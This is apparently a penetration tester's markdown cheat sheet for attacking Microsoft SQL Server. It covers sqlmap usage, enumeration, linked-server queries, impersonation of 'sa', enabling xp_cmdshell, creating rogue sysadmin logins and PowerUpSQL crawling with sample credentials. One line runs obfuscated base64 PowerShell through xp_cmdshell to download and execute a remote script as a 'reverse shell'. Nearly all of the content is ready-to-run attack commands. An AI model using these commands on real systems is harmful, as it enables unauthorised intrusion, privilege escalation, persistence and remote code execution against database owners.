### SQLMAP
```
python sqlmap.py -r req.txt --dbms=mssql 
python sqlmap.py -r req.txt --dbms=mssql --sql-shell --time-sec 2
```

### MSSQL Useful Commands
#### Enumeration
```
# Select version
SELECT @@VERSION

# Get current user
SELECT SYSTEM_USER
SELECT USER_NAME()

# Check if SA. Response '1' means yes.
SELECT IS_SRVROLEMEMBER('sysadmin', 'webapp11')
```

#### Links
```
# Get SQL links
select * from master..sysservers
# Or
EXEC sp_linkedservers;
# Or
use master
go
select srvid,srvstatus, srvname,srvproduct,datasource,schemadate,catalog from sys.sysservers

# Run query on link
SELECT * FROM OPENQUERY([SQL03],'SELECT SYSTEM_USER')
# Or 
EXEC ('SELECT SYSTEM_USER') AT [SQL03]
```

#### Login Impersonation
```
# Impoersonate login:
Execute As Login = 'sa'
Go
Select System_user
```

#### Stored Procedures
```
# Check if RPC OUT is enabled on linked servers:
SELECT 
    is_rpc_out_enabled,name
FROM sys.servers

# Enable RPC OUT on linked servers:
EXEC sp_serveroption 
    @server = 'SQL03', 
    @optname = 'rpc out', 
    @optvalue = 'on';

# Check if xp_cmdshell is enabled.
SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name = 'xp_cmdshell';

# Enable xp_cmdshell
EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;

# Execute xp_cmdshell
EXEC master.dbo.xp_cmdshell 'ping 192.168.45.215'
EXEC master..xp_cmdshell 'ping 192.168.45.215'

# Enable xp_dirtree
EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_dirtree',1; RECONFIGURE;

# Execute xp_dirtree
EXEC master..xp_dirtree 'C:\'

# Verify ping using tcpdump 
tcpdump -i tun0 icmp

# Open simple reverse shell:
EXEC ('EXEC master..xp_cmdshell ''powershell -ep bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADUALgAyADEAMAAvAGIAdQBuAGQAbABlAF8AdgBwAG4ALgB0AHgAdAAnACkA''') AT "SQL03"
```

#### Add SQL Users
````
EXEC ('EXEC sp_addlogin ''ofir'', ''password123!''') at [SQL27];
EXEC ('EXEC sp_addsrvrolemember ''ofir'', ''sysadmin''') at [SQL27];
Get-SQLQuery -Verbose -Username webapp11 -Password 89543dfGDFGH4d -Query "EXEC ('EXEC sp_addlogin ''ofir'', ''password123!''') at [SQL27];"
EXEC ('EXEC sp_addsrvrolemember ''ofir'', ''sysadmin''') at [SQL27];"
````

#### PowerUpSQL
```
# Enumerate targets:
$Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username testuser -password testpass | Where-Object {$_.Status -like "Accessible"}

# Link crawl:
Get-SqlServerLinkCrawl -Verbose -Instance SQLSERVER1\Instance1
$Targets | Get-SqlServerLinkCrawl -Verbose
Get-SQLServerLinkCrawl -Username webapp11 -Password 123456
Get-SQLServerLinkCrawl -Username webapp11 -Password 123456 -Query "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"

# Audit and Privesc
Invoke-SQLAudit -Verbose -Instance SQLServer1
$Targets | Invoke-SQLAudit -Verbose

# SQL query:
Get-SQLQuery -Verbose -Instance "SQLServer1,1433" -Query "Select System_user"
```
